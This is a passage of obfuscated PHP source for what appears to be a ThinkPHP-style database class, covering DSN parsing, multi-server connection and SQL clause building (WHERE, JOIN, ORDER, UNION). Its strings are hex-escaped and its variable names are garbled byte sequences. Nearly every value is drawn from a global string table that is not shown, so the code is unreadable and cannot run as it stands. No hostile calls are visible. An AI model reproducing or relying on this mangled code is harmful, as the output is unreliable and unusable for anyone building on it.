"\x4e\117\x54\40\x49\x4e", "\x62\145\x74\x77\145\145\156" => "\102\x45\124\x57\x45\105\x4e", "\156\x6f\x74\142\x65\x74\x77\145\145\156" => "\x4e\117\x54\40\x42\105\x54\127\105\105\x4e", "\156\157\x74\40\x62\x65\x74\x77\145\x65\x6e" => "\x4e\x4f\124\x20\x42\105\124\127\105\105\116"); protected $selectSql = "\x53\105\x4c\105\x43\124\x25\104\x49\x53\x54\x49\x4e\103\x54\x25\40\x25\x46\111\105\114\x44\x25\40\x46\x52\117\x4d\x20\x25\x54\101\102\x4c\x45\45\45\112\117\111\116\x25\45\127\x48\105\x52\105\x25\45\x47\x52\x4f\125\x50\45\x25\110\x41\x56\x49\116\x47\45\x25\117\x52\104\105\122\x25\x25\x4c\x49\115\111\124\45\x20\x25\125\x4e\111\x4f\x4e\x25\45\x43\117\115\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $ÎÚ¦“»ş = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[•Ùç É][1011], $ÎÚ¦“»ş); } public function factory($•Áìü‰ˆ = '') { $ÕÆÜîğŒ =& $_SERVER[•Ùç É]; $•Áìü‰ˆ = $this->parseConfig($•Áìü‰ˆ); if (empty($•Áìü‰ˆ[$ÕÆÜîğŒ[1012]])) { think_exception(think_lang($ÕÆÜîğŒ[1013])); } $this->dbType = ucwords(strtolower($•Áìü‰ˆ[$ÕÆÜîğŒ[1012]])); $ûø ‹û = $ÕÆÜîğŒ[1014] . $this->dbType; if (class_exists($ûø ‹û)) { $¹¿ç­ß = new $ûø ‹û($•Áìü‰ˆ); if ($ÕÆÜîğŒ[1015] != strtolower($•Áìü‰ˆ[$ÕÆÜîğŒ[1012]])) { $¹¿ç­ß->dbType = strtoupper($this->dbType); } else { $¹¿ç­ß->dbType = $this->_getDsnType($•Áìü‰ˆ[$ÕÆÜîğŒ[967]]); } } else { think_exception(think_lang($ÕÆÜîğŒ[1016]) . $ÕÆÜîğŒ[1017] . $ûø ‹û); } return $¹¿ç­ß; } public function __call($“§Ï½ú†, $¬‹´®‘–) { if (method_exists($this, $“§Ï½ú†)) { return call_user_func_array(array($this, $“§Ï½ú†), $¬‹´®‘–); } } protected function _getDsnType($ø™õ¸¡½) { $ÏŸ•§ÚÕ = explode($_SERVER[•Ùç É][4], $ø™õ¸¡½); $×Ù´„À = strtoupper(trim($ÏŸ•§ÚÕ[0])); return $×Ù´„À; } private function parseConfig($åäğ»‡å = '') { $ÙÁš´ğª =& $_SERVER[•Ùç É]; if (!empty($åäğ»‡å) && is_string($åäğ»‡å)) { $åäğ»‡å = $this->parseDSN($åäğ»‡å); } elseif (is_array($åäğ»‡å)) { $åäğ»‡å = array_change_key_case($åäğ»‡å); $åäğ»‡å = array($ÙÁš´ğª[1012] => $åäğ»‡å[$ÙÁš´ğª[1018]], $ÙÁš´ğª[939] => $åäğ»‡å[$ÙÁš´ğª[1019]], $ÙÁš´ğª[940] => $åäğ»‡å[$ÙÁš´ğª[1020]], $ÙÁš´ğª[937] => $åäğ»‡å[$ÙÁš´ğª[1021]], $ÙÁš´ğª[938] => $åäğ»‡å[$ÙÁš´ğª[1022]], $ÙÁš´ğª[21] => $åäğ»‡å[$ÙÁš´ğª[1023]], $ÙÁš´ğª[967] => $åäğ»‡å[$ÙÁš´ğª[1024]], $ÙÁš´ğª[17] => isset($åäğ»‡å[$ÙÁš´ğª[1025]]) ? $åäğ»‡å[$ÙÁš´ğª[1025]] : array()); } elseif (empty($åäğ»‡å)) { if (think_config($ÙÁš´ğª[1026]) && $ÙÁš´ğª[1015] != strtolower(think_config($ÙÁš´ğª[1027]))) { $åäğ»‡å = $this->parseDSN(think_config($ÙÁš´ğª[1026])); } else { $åäğ»‡å = array($ÙÁš´ğª[1012] => think_config($ÙÁš´ğª[1027]), $ÙÁš´ğª[939] => think_config($ÙÁš´ğª[1028]), $ÙÁš´ğª[940] => think_config($ÙÁš´ğª[1029]), $ÙÁš´ğª[937] => think_config($ÙÁš´ğª[1030]), $ÙÁš´ğª[938] => think_config($ÙÁš´ğª[1031]), $ÙÁš´ğª[21] => think_config($ÙÁš´ğª[292]), $ÙÁš´ğª[967] => think_config($ÙÁš´ğª[1026]), $ÙÁš´ğª[17] => think_config($ÙÁš´ğª[1032])); } } return $åäğ»‡å; } protected function initConnect($şƒàí¸ = true) { if (1 == think_config($_SERVER[•Ùç É][22])) { $this->_linkID = $this->multiConnect($şƒàí¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $‚ñ¬ÁË¥ => $Ø‰©·­€) { $this->_linkID = $Ø‰©·­€; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($½ë”Ç­¹ = false) { $±‚ßÎ…Û =& $_SERVER[•Ùç É]; static $ÇæÇ¨³â = array(); static $ÈÒÙ®Úš = -1; if (empty($ÇæÇ¨³â)) { foreach ($this->config as $ÑµøÍ¼Ü => $§ÏÊÙ‹ş) { $ÇæÇ¨³â[$ÑµøÍ¼Ü] = explode($±‚ßÎ…Û[50], $§ÏÊÙ‹ş); } } if (think_config($±‚ßÎ…Û[1033])) { if ($½ë”Ç­¹ || think_config($±‚ßÎ…Û[441]) === !0) { $Á‹÷¹à = floor(mt_rand(0, think_config($±‚ßÎ…Û[1034]) - 1)); $ÈÒÙ®Úš = $Á‹÷¹à; } else { if (is_numeric(think_config($±‚ßÎ…Û[1035]))) { $Á‹÷¹à = think_config($±‚ßÎ…Û[1035]); } else { $Á‹÷¹à = floor(mt_rand(think_config($±‚ßÎ…Û[1034]), count($ÇæÇ¨³â[$±‚ßÎ…Û[937]]) - 1)); } } } else { $Á‹÷¹à = floor(mt_rand(0, count($ÇæÇ¨³â[$±‚ßÎ…Û[937]]) - 1)); $ÈÒÙ®Úš = $Á‹÷¹à; } $Á‹÷¹à = $ÈÒÙ®Úš !== -1 ? $ÈÒÙ®Úš : $Á‹÷¹à; $¨Ëˆïı× = array($±‚ßÎ…Û[939] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[939]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[939]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[939]][0], $±‚ßÎ…Û[940] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[940]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[940]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[940]][0], $±‚ßÎ…Û[937] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[937]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[937]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[937]][0], $±‚ßÎ…Û[938] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[938]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[938]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[938]][0], $±‚ßÎ…Û[21] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[21]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[21]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[21]][0], $±‚ßÎ…Û[967] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[967]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[967]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[967]][0], $±‚ßÎ…Û[17] => isset($ÇæÇ¨³â[$±‚ßÎ…Û[17]][$Á‹÷¹à]) ? $ÇæÇ¨³â[$±‚ßÎ…Û[17]][$Á‹÷¹à] : $ÇæÇ¨³â[$±‚ßÎ…Û[17]][0]); return $this->connect($¨Ëˆïı×, $Á‹÷¹à); } public function parseDSN($ñîêÙ÷‚) { $¥¤…¼Ú¯ =& $_SERVER[•Ùç É]; if (empty($ñîêÙ÷‚)) { return !1; } $üÚ¨ŠÙ = parse_url($ñîêÙ÷‚); if ($üÚ¨ŠÙ[$¥¤…¼Ú¯[197]]) { $İ´ñ¶¹ = array($¥¤…¼Ú¯[1012] => $üÚ¨ŠÙ[$¥¤…¼Ú¯[197]], $¥¤…¼Ú¯[939] => isset($üÚ¨ŠÙ[$¥¤…¼Ú¯[632]]) ? $üÚ¨ŠÙ[$¥¤…¼Ú¯[632]] : $¥¤…¼Ú¯[12], $¥¤…¼Ú¯[940] => isset($üÚ¨ŠÙ[$¥¤…¼Ú¯[1036]]) ? $üÚ¨ŠÙ[$¥¤…¼Ú¯[1036]] : $¥¤…¼Ú¯[12], $¥¤…¼Ú¯[937] => isset($üÚ¨ŠÙ[$¥¤…¼Ú¯[198]]) ? $üÚ¨ŠÙ[$¥¤…¼Ú¯[198]] : $¥¤…¼Ú¯[12], $¥¤…¼Ú¯[938] => isset($üÚ¨ŠÙ[$¥¤…¼Ú¯[199]]) ? $üÚ¨ŠÙ[$¥¤…¼Ú¯[199]] : $¥¤…¼Ú¯[12], $¥¤…¼Ú¯[21] => isset($üÚ¨ŠÙ[$¥¤…¼Ú¯[86]]) ? substr($üÚ¨ŠÙ[$¥¤…¼Ú¯[86]], 1) : $¥¤…¼Ú¯[12]); } else { preg_match($¥¤…¼Ú¯[1037], trim($ñîêÙ÷‚), $îÇ ); $İ´ñ¶¹ = array($¥¤…¼Ú¯[1012] => $îÇ [1], $¥¤…¼Ú¯[939] => $îÇ [2], $¥¤…¼Ú¯[940] => $îÇ [3], $¥¤…¼Ú¯[937] => $îÇ [4], $¥¤…¼Ú¯[938] => $îÇ [5], $¥¤…¼Ú¯[21] => $îÇ [6]); } $İ´ñ¶¹[$¥¤…¼Ú¯[967]] = $¥¤…¼Ú¯[12]; return $İ´ñ¶¹; } protected function debug() { $£˜š«”² =& $_SERVER[•Ùç É]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $£˜š«”²[1038]; if (think_config($£˜š«”²[1039])) { think_status($£˜š«”²[1040]); think_trace($this->queryStr . $£˜š«”²[1041] . think_status($£˜š«”²[24], $£˜š«”²[1040], 6) . $£˜š«”²[1042], $£˜š«”²[12], $£˜š«”²[1043]); } } protected function parseLock($ÃÙÜÕ»× = false) { $ßãÁÔÌ =& $_SERVER[•Ùç É]; if (!$ÃÙÜÕ»×) { return $ßãÁÔÌ[12]; } if ($ßãÁÔÌ[969] == $this->dbType) { return $ßãÁÔÌ[1044]; } return $ßãÁÔÌ[1045]; } protected function parseSet($ÔšÎÆÎ) { $Æ®õòÑ€ =& $_SERVER[•Ùç É]; foreach ($ÔšÎÆÎ as $’İÈ¢ëÖ => $ÌÜÀË­) { if (is_array($ÌÜÀË­) && $Æ®õòÑ€[343] == $ÌÜÀË­[0]) { $½ŸÅ¢Î¬[] = $this->parseKey($’İÈ¢ëÖ) . $Æ®õòÑ€[935] . $ÌÜÀË­[1]; } elseif (is_scalar($ÌÜÀË­) || is_null($ÌÜÀË­)) { $½ŸÅ¢Î¬[] = $this->parseKey($’İÈ¢ëÖ) . $Æ®õòÑ€[935] . $this->parseValue($ÌÜÀË­); } } return $Æ®õòÑ€[1046] . implode($Æ®õòÑ€[50], $½ŸÅ¢Î¬); } protected function bindParam($¥¦‚ì™¹, $­°„úÏ‘) { $this->bind[$_SERVER[•Ùç É][4] . $¥¦‚ì™¹] = $­°„úÏ‘; } protected function parseBind($ÏË©òœ—) { $ÏË©òœ— = array_merge($this->bind, $ÏË©òœ—); $this->bind = array(); return $ÏË©òœ—; } function parseKey(&$âØ»ƒ‘, $Ü°öì€ã = true) { if ($Ü°öì€ã) { $âØ»ƒ‘ = $this->parseKeyCheck($âØ»ƒ‘); } return $âØ»ƒ‘; } function parseKeyCheck($ïœ¿Ãé­) { $û±¿ÜŠ¨ =& $_SERVER[•Ùç É]; $ïœ¿Ãé­ = trim($ïœ¿Ãé­); if (!preg_match($û±¿ÜŠ¨[1047], $ïœ¿Ãé­)) { think_exception($û±¿ÜŠ¨[1048] . $ïœ¿Ãé­); } return $ïœ¿Ãé­; } protected function parseValue($•¸µ…å) { $Î»­†ªİ =& $_SERVER[•Ùç É]; if (is_string($•¸µ…å)) { $•¸µ…å = $Î»­†ªİ[1008] . $this->escapeString($•¸µ…å) . $Î»­†ªİ[1008]; } elseif (isset($•¸µ…å[0]) && is_string($•¸µ…å[0]) && strtolower($•¸µ…å[0]) == $Î»­†ªİ[343]) { $•¸µ…å = $this->escapeString($•¸µ…å[1]); } elseif (is_array($•¸µ…å)) { $•¸µ…å = array_map(array($this, $Î»­†ªİ[1009]), $•¸µ…å); } elseif (is_bool($•¸µ…å)) { $•¸µ…å = $•¸µ…å ? $Î»­†ªİ[90] : $Î»­†ªİ[214]; } elseif (is_null($•¸µ…å)) { $•¸µ…å = $Î»­†ªİ[105]; } return $•¸µ…å; } protected function parseField($­Üı¥Öº) { $†±³èÛ =& $_SERVER[•Ùç É]; if (is_string($­Üı¥Öº) && strpos($­Üı¥Öº, $†±³èÛ[50])) { $­Üı¥Öº = explode($†±³èÛ[50], $­Üı¥Öº); } if (is_array($­Üı¥Öº)) { $¼ÃÓ®éë = array(); foreach ($­Üı¥Öº as $ĞÄñá¨ => $šÜŠ°ù) { if (!is_numeric($ĞÄñá¨)) { $¼ÃÓ®éë[] = $this->parseKey($ĞÄñá¨, !1) . $†±³èÛ[1049] . $this->parseKey($šÜŠ°ù); } else { $¼ÃÓ®éë[] = $this->parseKey($šÜŠ°ù); } } $•ı’¡…ù = implode($†±³èÛ[50], $¼ÃÓ®éë); } elseif (is_string($­Üı¥Öº) && !empty($­Üı¥Öº)) { $•ı’¡…ù = $­Üı¥Öº; } else { $•ı’¡…ù = $†±³èÛ[205]; } return $•ı’¡…ù; } protected function parseTable($ÜÛ¾Æëñ) { $«èØÖ§ =& $_SERVER[•Ùç É]; if (is_array($ÜÛ¾Æëñ)) { $Í¡É¶ü· = array(); foreach ($ÜÛ¾Æëñ as $ˆ‚²¯êÅ => $¹ªôÄîÏ) { if (!is_numeric($ˆ‚²¯êÅ)) { $Í¡É¶ü·[] = $this->parseKey($ˆ‚²¯êÅ) . $«èØÖ§[53] . $this->parseKey($¹ªôÄîÏ); } else { $Í¡É¶ü·[] = $this->parseKey($ˆ‚²¯êÅ); } } $ÜÛ¾Æëñ = $Í¡É¶ü·; } elseif (is_string($ÜÛ¾Æëñ)) { if (strstr($ÜÛ¾Æëñ, $«èØÖ§[53])) { return $ÜÛ¾Æëñ; } $ÜÛ¾Æëñ = explode($«èØÖ§[50], $ÜÛ¾Æëñ); array_walk($ÜÛ¾Æëñ, array($this, $«èØÖ§[957])); } return $«èØÖ§[951] . trim(implode($«èØÖ§[1050], $ÜÛ¾Æëñ), $«èØÖ§[431]) . $«èØÖ§[951]; } protected function parseWhere($«Û¢ó³) { $¨ñÍ±» =& $_SERVER[•Ùç É]; $™Ùš¥Üê = $¨ñÍ±»[12]; if (is_string($«Û¢ó³)) { $™Ùš¥Üê = $«Û¢ó³; } else { $û¾æ¸Ñ = isset($«Û¢ó³[$¨ñÍ±»[1051]]) ? strtoupper($«Û¢ó³[$¨ñÍ±»[1051]]) : $¨ñÍ±»[12]; if (in_array($û¾æ¸Ñ, array($¨ñÍ±»[1052], $¨ñÍ±»[1053], $¨ñÍ±»[1054]))) { $û¾æ¸Ñ = $¨ñÍ±»[53] . $û¾æ¸Ñ . $¨ñÍ±»[53]; unset($«Û¢ó³[$¨ñÍ±»[1051]]); } else { $û¾æ¸Ñ = $¨ñÍ±»[1055]; } foreach ($«Û¢ó³ as $ñ—Œüï° => $ØÑ‰ê˜°) { $™Ùš¥Üê .= $¨ñÍ±»[323]; if (is_numeric($ñ—Œüï°)) { $ñ—Œüï° = $¨ñÍ±»[1056]; } if (0 === strpos($ñ—Œüï°, $¨ñÍ±»[11])) { $™Ùš¥Üê .= $this->parseThinkWhere($ñ—Œüï°, $ØÑ‰ê˜°); } else { if (!preg_match($¨ñÍ±»[1057], trim($ñ—Œüï°))) { think_exception(think_lang($¨ñÍ±»[1058]) . $¨ñÍ±»[4] . $ñ—Œüï°); } $õªÂ¶´ò = is_array($ØÑ‰ê˜°) && isset($ØÑ‰ê˜°[$¨ñÍ±»[1059]]); $ñ—Œüï° = trim($ñ—Œüï°); if (strpos($ñ—Œüï°, $¨ñÍ±»[329])) { $§”Îš¡ = explode($¨ñÍ±»[329], $ñ—Œüï°); $Ÿ–ášä– = array(); foreach ($§”Îš¡ as $‹åŠöú => $ŞÊä¬‘ù) { $™¹õñõ  = $õªÂ¶´ò ? $ØÑ‰ê˜°[$‹åŠöú] : $ØÑ‰ê˜°; $Ÿ–ášä–[] = $¨ñÍ±»[306] . $this->parseWhereItem($this->parseKey($ŞÊä¬‘ù), $™¹õñõ ) . $¨ñÍ±»[956]; } $™Ùš¥Üê .= implode($¨ñÍ±»[1060], $Ÿ–ášä–); } elseif (strpos($ñ—Œüï°, $¨ñÍ±»[330])) { $§”Îš¡ = explode($¨ñÍ±»[330], $ñ—Œüï°); $Ÿ–ášä– = array(); foreach ($§”Îš¡ as $‹åŠöú => $ŞÊä¬‘ù) { $™¹õñõ  = $õªÂ¶´ò ? $ØÑ‰ê˜°[$‹åŠöú] : $ØÑ‰ê˜°; $Ÿ–ášä–[] = $¨ñÍ±»[306] . $this->parseWhereItem($this->parseKey($ŞÊä¬‘ù), $™¹õñõ ) . $¨ñÍ±»[956]; } $™Ùš¥Üê .= implode($¨ñÍ±»[1055], $Ÿ–ášä–); } else { $™Ùš¥Üê .= $this->parseWhereItem($this->parseKey($ñ—Œüï°), $ØÑ‰ê˜°); } } $™Ùš¥Üê .= $¨ñÍ±»[324] . $û¾æ¸Ñ; } $™Ùš¥Üê = substr($™Ùš¥Üê, 0, -strlen($û¾æ¸Ñ)); } return empty($™Ùš¥Üê) ? $¨ñÍ±»[12] : $¨ñÍ±»[1061] . $™Ùš¥Üê; } protected function parseWhereItem($ÀÛ²¢Àé, $”Œ‘ÚãÑ) { $¿Ô”Ã =& $_SERVER[•Ùç É]; $Ä¼•Ê¿ó = $¿Ô”Ã[12]; if (is_array($”Œ‘ÚãÑ)) { if (is_string($”Œ‘ÚãÑ[0])) { $÷Ä…¨ù = strtolower($”Œ‘ÚãÑ[0]); if (in_array($”Œ‘ÚãÑ[0], array($¿Ô”Ã[935], $¿Ô”Ã[1062], $¿Ô”Ã[1063], $¿Ô”Ã[1064], $¿Ô”Ã[1065], $¿Ô”Ã[1066]))) { $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[53] . $”Œ‘ÚãÑ[0] . $¿Ô”Ã[53] . $this->parseValue($”Œ‘ÚãÑ[1]); } elseif (preg_match($¿Ô”Ã[1067], $”Œ‘ÚãÑ[0])) { $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[53] . $this->parseValue($”Œ‘ÚãÑ[1]); } elseif (preg_match($¿Ô”Ã[1068], $”Œ‘ÚãÑ[0])) { if (is_array($”Œ‘ÚãÑ[1])) { $ûáÅÉ†© = isset($”Œ‘ÚãÑ[2]) ? strtoupper($”Œ‘ÚãÑ[2]) : $¿Ô”Ã[1053]; if (in_array($ûáÅÉ†©, array($¿Ô”Ã[1052], $¿Ô”Ã[1053], $¿Ô”Ã[1054]))) { $µ´ª¥üÈ = array(); foreach ($”Œ‘ÚãÑ[1] as $Á’·£ïó) { $µ´ª¥üÈ[] = $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[53] . $this->parseValue($Á’·£ïó); } $Ä¼•Ê¿ó .= $¿Ô”Ã[306] . implode($¿Ô”Ã[53] . $ûáÅÉ†© . $¿Ô”Ã[53], $µ´ª¥üÈ) . $¿Ô”Ã[956]; } } else { $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[53] . $this->parseValue($”Œ‘ÚãÑ[1]); } } elseif ($¿Ô”Ã[343] == $÷Ä…¨ù) { $Ä¼•Ê¿ó .= $¿Ô”Ã[954] . $ÀÛ²¢Àé . $¿Ô”Ã[53] . $”Œ‘ÚãÑ[1] . $¿Ô”Ã[1069]; } elseif (preg_match($¿Ô”Ã[1070], $”Œ‘ÚãÑ[0])) { $Ä¼•Ê¿ó .= $”Œ‘ÚãÑ[0]; } elseif (preg_match($¿Ô”Ã[1071], $”Œ‘ÚãÑ[0])) { if (isset($”Œ‘ÚãÑ[2]) && $¿Ô”Ã[343] == $”Œ‘ÚãÑ[2]) { $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[53] . $”Œ‘ÚãÑ[1]; } else { if (is_string($”Œ‘ÚãÑ[1])) { $”Œ‘ÚãÑ[1] = explode($¿Ô”Ã[50], $”Œ‘ÚãÑ[1]); } $ÏéÉÓœ¾ = implode($¿Ô”Ã[50], $this->parseValue($”Œ‘ÚãÑ[1])); $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[954] . $ÏéÉÓœ¾ . $¿Ô”Ã[956]; } } elseif (preg_match($¿Ô”Ã[1072], $”Œ‘ÚãÑ[0])) { $¤©‡Ó¹˜ = is_string($”Œ‘ÚãÑ[1]) ? explode($¿Ô”Ã[50], $”Œ‘ÚãÑ[1]) : $”Œ‘ÚãÑ[1]; $Ä¼•Ê¿ó .= $¿Ô”Ã[954] . $ÀÛ²¢Àé . $¿Ô”Ã[53] . $this->exp[$÷Ä…¨ù] . $¿Ô”Ã[53] . $this->parseValue($¤©‡Ó¹˜[0]) . $¿Ô”Ã[1055] . $this->parseValue($¤©‡Ó¹˜[1]) . $¿Ô”Ã[324]; } else { think_exception(think_lang($¿Ô”Ã[1058]) . $¿Ô”Ã[4] . $”Œ‘ÚãÑ[0]); } } else { $¬–²ÉäÓ = count($”Œ‘ÚãÑ); $ô¹Ãõ•Í = $¿Ô”Ã[12]; if (is_string($”Œ‘ÚãÑ[$¬–²ÉäÓ - 1])) { $ô¹Ãõ•Í = isset($”Œ‘ÚãÑ[$¬–²ÉäÓ - 1]) ? strtoupper($”Œ‘ÚãÑ[$¬–²ÉäÓ - 1]) : $¿Ô”Ã[12]; if (in_array($ô¹Ãõ•Í, array($¿Ô”Ã[1052], $¿Ô”Ã[1053], $¿Ô”Ã[1054]))) { $¬–²ÉäÓ = $¬–²ÉäÓ - 1; } } else { $ô¹Ãõ•Í = $¿Ô”Ã[1052]; } for ($¨öÁô‡÷ = 0; $¨öÁô‡÷ < $¬–²ÉäÓ; $¨öÁô‡÷++) { $¤©‡Ó¹˜ = is_array($”Œ‘ÚãÑ[$¨öÁô‡÷]) ? $”Œ‘ÚãÑ[$¨öÁô‡÷][1] : $”Œ‘ÚãÑ[$¨öÁô‡÷]; if ($¿Ô”Ã[343] == strtolower($”Œ‘ÚãÑ[$¨öÁô‡÷][0])) { $Ä¼•Ê¿ó .= $¿Ô”Ã[306] . $ÀÛ²¢Àé . $¿Ô”Ã[53] . $¤©‡Ó¹˜ . $¿Ô”Ã[1069] . $ô¹Ãõ•Í . $¿Ô”Ã[53]; } else { $òó»€° = is_array($”Œ‘ÚãÑ[$¨öÁô‡÷]) ? $this->exp[strtolower($”Œ‘ÚãÑ[$¨öÁô‡÷][0])] : $¿Ô”Ã[935]; if (!$òó»€° && is_array($”Œ‘ÚãÑ[$¨öÁô‡÷]) && in_array($”Œ‘ÚãÑ[$¨öÁô‡÷][0], array($¿Ô”Ã[935], $¿Ô”Ã[1062], $¿Ô”Ã[1063], $¿Ô”Ã[1064], $¿Ô”Ã[1065], $¿Ô”Ã[1066]))) { $òó»€° = $”Œ‘ÚãÑ[$¨öÁô‡÷][0]; } $Ä¼•Ê¿ó .= $¿Ô”Ã[306] . $ÀÛ²¢Àé . $¿Ô”Ã[53] . $òó»€° . $¿Ô”Ã[53] . $this->parseValue($¤©‡Ó¹˜) . $¿Ô”Ã[1069] . $ô¹Ãõ•Í . $¿Ô”Ã[53]; } } $Ä¼•Ê¿ó = substr($Ä¼•Ê¿ó, 0, -4); } } else { $Ä¼•Ê¿ó .= $ÀÛ²¢Àé . $¿Ô”Ã[1073] . $this->parseValue($”Œ‘ÚãÑ); } return $Ä¼•Ê¿ó; } protected function parseThinkWhere($Îø§’ğ¥, $¢ô§¹“¿) { $¸¸¨åèì =& $_SERVER[•Ùç É]; $Ê†óÁ¬Ö = $¸¸¨åèì[12]; switch ($Îø§’ğ¥) { case $¸¸¨åèì[398]: $Ê†óÁ¬Ö = $¢ô§¹“¿; break; case $¸¸¨åèì[1056]: $Ê†óÁ¬Ö = is_string($¢ô§¹“¿) ? $¢ô§¹“¿ : substr($this->parseWhere($¢ô§¹“¿), 6); break; case $¸¸¨åèì[1074]: parse_str($¢ô§¹“¿, $èÖôÚÃÇ); if (isset($èÖôÚÃÇ[$¸¸¨åèì[1051]])) { $ë’£‡—Ñ = $¸¸¨åèì[53] . strtoupper($èÖôÚÃÇ[$¸¸¨åèì[1051]]) . $¸¸¨åèì[53]; unset($èÖôÚÃÇ[$¸¸¨åèì[1051]]); } else { $ë’£‡—Ñ = $¸¸¨åèì[1055]; } $›ÍÑØÊ = array(); foreach ($èÖôÚÃÇ as $ä„å§¦  => $†ºï©Í¬) { $›ÍÑØÊ[] = $this->parseKey($ä„å§¦ ) . $¸¸¨åèì[1073] . $this->parseValue($†ºï©Í¬); } $Ê†óÁ¬Ö = implode($ë’£‡—Ñ, $›ÍÑØÊ); break; } return $Ê†óÁ¬Ö; } protected function parseLimit($ª‘¹Ô­©) { $„Ì´Ã×¨ =& $_SERVER[•Ùç É]; return !empty($ª‘¹Ô­©) ? $„Ì´Ã×¨[51] . $ª‘¹Ô­© . $„Ì´Ã×¨[53] : $„Ì´Ã×¨[12]; } protected function parseJoin($ŒÌ¯óÜ¥) { $Êà§ğ =& $_SERVER[•Ùç É]; $ØĞ¦É³Ê = $Êà§ğ[12]; if (!empty($ŒÌ¯óÜ¥)) { if (is_array($ŒÌ¯óÜ¥)) { foreach ($ŒÌ¯óÜ¥ as $ï‰±”Œ¬ => $½µ½úÓ­) { if (!1 !== stripos($½µ½úÓ­, $Êà§ğ[1075])) { $ØĞ¦É³Ê .= $Êà§ğ[53] . $½µ½úÓ­; } else { $ØĞ¦É³Ê .= $Êà§ğ[1076] . $½µ½úÓ­; } } } else { $ØĞ¦É³Ê .= $Êà§ğ[1076] . $ŒÌ¯óÜ¥; } } $ØĞ¦É³Ê = preg_replace($Êà§ğ[1077], think_config($Êà§ğ[981]) . $Êà§ğ[1078], $ØĞ¦É³Ê); return $ØĞ¦É³Ê; } protected function parseOrder($²÷‡Ü±Å) { $È¹Ï¡µæ =& $_SERVER[•Ùç É]; if (is_array($²÷‡Ü±Å)) { $Ê…ß½¦Œ = array(); foreach ($²÷‡Ü±Å as $ÆÃˆİô => $­î–‚¦í) { if (is_numeric($ÆÃˆİô)) { $Ê…ß½¦Œ[] = $this->parseKey($­î–‚¦í); } else { $­î–‚¦í = in_array(strtoupper(trim($­î–‚¦í)), array($È¹Ï¡µæ[1079], $È¹Ï¡µæ[1080])) ? $È¹Ï¡µæ[53] . $­î–‚¦í : $È¹Ï¡µæ[12]; if (preg_match($È¹Ï¡µæ[1081], $ÆÃˆİô)) { $Ê…ß½¦Œ[] = $this->parseKey($ÆÃˆİô) . $­î–‚¦í; } else { think_exception($È¹Ï¡µæ[1082] . $ÆÃˆİô); } } } $²÷‡Ü±Å = implode($È¹Ï¡µæ[50], $Ê…ß½¦Œ); } return !empty($²÷‡Ü±Å) ? $È¹Ï¡µæ[1083] . $²÷‡Ü±Å : $È¹Ï¡µæ[12]; } protected function parseGroup($¸Š•Éº‡) { $Œ÷„äŞ¼ =& $_SERVER[•Ùç É]; return !empty($¸Š•Éº‡) ? $Œ÷„äŞ¼[1084] . $¸Š•Éº‡ : $Œ÷„äŞ¼[12]; } protected function parseHaving($ññŒâóÖ) { $¸Óò­“  =& $_SERVER[•Ùç É]; return !empty($ññŒâóÖ) ? $¸Óò­“ [1085] . $ññŒâóÖ : $¸Óò­“ [12]; } protected function parseComment($­´Àôå¾) { $Ë‡ìÇñ =& $_SERVER[•Ùç É]; return !empty($­´Àôå¾) ? $Ë‡ìÇñ[1086] . $­´Àôå¾ . $Ë‡ìÇñ[1087] : $Ë‡ìÇñ[12]; } protected function parseDistinct($…Ã½Ïàã) { $³éŸü˜è =& $_SERVER[•Ùç É]; return !empty($…Ã½Ïàã) ? $³éŸü˜è[1088] : $³éŸü˜è[12]; } protected function parseUnion($×•Ñ·‡Ô) { $´ûÖŞŒ =& $_SERVER[•Ùç É]; if (empty($×•Ñ·‡Ô)) { return $´ûÖŞŒ[12]; } if (isset($×•Ñ·‡Ô[$´ûÖŞŒ[394]])) { $Ñç×üë— = $´ûÖŞŒ[1089]; unset($×•Ñ·‡Ô[$´ûÖŞŒ[394]]); } else { $Ñç×üë— = $´ûÖŞŒ[1090]; } foreach ($×•Ñ·‡Ô as $©‘Ç·ı) { $¤æ²ˆšù[] = $Ñç×üë— . (is_array($©‘Ç·ı) ? $this->buildSelectSql($©‘Ç·ı) : $©‘Ç·ı); } return implode($´ûÖŞŒ[53], $¤æ²ˆšù); } public function insert($äß½Ì¢è, $ŸÇéí = array(), $ãøä°èí = false) { 